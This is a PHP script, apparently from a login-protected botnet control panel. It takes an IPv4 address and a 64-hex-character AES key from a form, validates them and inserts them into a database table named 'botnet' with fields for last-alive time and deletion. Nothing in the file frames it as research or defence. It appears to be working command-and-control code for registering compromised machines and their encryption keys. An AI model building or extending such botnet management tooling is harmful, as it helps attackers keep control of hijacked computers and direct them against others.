<?php
include 'panel_login.php';

include 'sql_connect.php';

// ===== 讀取 GET 參數 =====
$ip  = isset($_POST['ip'])  ? trim($_POST['ip'])  : null;
$key = isset($_POST['key']) ? $_POST['key'] : null;



if (!$ip || !$key) {
    die("缺少必要參數 ip 或 key");
}

if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    die("ip 格式錯誤");
}

if (!ctype_xdigit($key) || strlen($key) !== 64) {
    die("key 必須是 64 個 hex 字符（32 bytes）");
}

$ip_bin = inet_pton($ip);

// Debug（測試用）
// var_dump($ip_bin, strlen($ip_bin));

$sql = "
    INSERT INTO botnet (ip, aes_key, last_alive_time, is_deleted)
    VALUES (?, UNHEX(?), 0, 0)
";

$stmt = mysqli_prepare($conn, $sql);

// ⭐⭐⭐ bind_param 型別必須是 "ss"，binary 也用 string
mysqli_stmt_bind_param($stmt, "ss", $ip_bin, $key);

if (mysqli_stmt_execute($stmt)) {
    header("Location: panel.php");
    exit;
} else {
    echo "新增失敗: " . mysqli_error($conn);
}

mysqli_stmt_close($stmt);
mysqli_close($conn);